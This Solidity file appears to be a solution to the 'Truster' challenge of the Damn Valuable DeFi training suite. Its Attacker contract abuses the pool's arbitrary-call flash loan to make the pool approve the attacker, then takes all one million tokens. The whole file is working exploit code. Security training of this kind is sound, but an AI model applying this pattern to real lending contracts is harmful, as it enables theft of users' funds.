// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attacker {
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public attacker;
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address _attacker
    ) {
        pool = _pool;
        token = _token;
        attacker = _attacker;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSelector(
            token.approve.selector,
            address(this),
            TOKENS_IN_POOL
        );
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
        token.transfer(attacker, TOKENS_IN_POOL);
    }
}
